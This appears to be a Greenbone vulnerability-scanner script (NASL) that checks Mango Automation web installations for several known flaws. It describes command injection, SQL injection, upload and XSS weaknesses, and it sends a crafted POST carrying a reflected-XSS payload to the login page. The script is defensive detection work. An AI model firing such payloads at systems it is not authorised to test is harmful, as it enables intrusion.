CPE = "cpe:/a:infinite_automation_systems:mango_automation";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806065" );
	script_version( "$Revision: 13659 $" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2015-10-01 12:11:26 +0530 (Thu, 01 Oct 2015)" );
	script_name( "Mango Automation Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Mango Automation
  and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP POST and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - Mango Automation contains default configuration for debugging enabled in the
    '/WEB-INF./web.xml' file (debug=true).

  - Improper verification of uploaded image files in
    'graphicalViewsBackgroundUpload' script via the 'backgroundImage' POST
     parameter.

  - Input sanitization error in '/sqlConsole.shtm' script.

  - Improper verification of provided credentials by 'login.htm' script.

  - The POST parameter 'c0-param0' in the testProcessCommand.dwr method is not
    properly sanitised before being used to execute commands." );
	script_tag( name: "impact", value: "Successful exploitation will allow a
  remote attackers to gain extra privilges, to gain access to sensitive
  information, to inject and execute arbitrary os commands, execute arbitrary
  script code in a users browser session, to execute arbitrary SQL commands
  with administrative privileges." );
	script_tag( name: "affected", value: "Mango Automation versions 2.5.2 and
  2.6.0 beta (build 327)." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/38338" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133732" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133734" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133726" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133733" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_mango_automation_detect.sc" );
	script_mandatory_keys( "Mango Automation/Installed" );
	script_require_ports( "Services/www", 8080 );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!mangoPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: mangoPort )){
	exit( 0 );
}
url = NASLString( dir, "/login.htm" );
req = http_get( item: url, port: mangoPort );
res = http_keepalive_send_recv( port: mangoPort, data: req );
useragent = http_get_user_agent();
if(ContainsString( res, "content=\"Mango Automation" ) && ContainsString( res, "id=\"loginForm" )){
	postData = "username=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&password=sd";
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", http_host_name( port: mangoPort ), "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", postData );
	res = http_keepalive_send_recv( port: mangoPort, data: req );
	if(IsMatchRegexp( res, "HTTP/1\\.. 200" ) && ContainsString( res, "\"><script>alert(document.cookie);</script>\"" ) && ContainsString( res, "welcomeToMango" )){
		security_message( mangoPort );
		exit( 0 );
	}
}

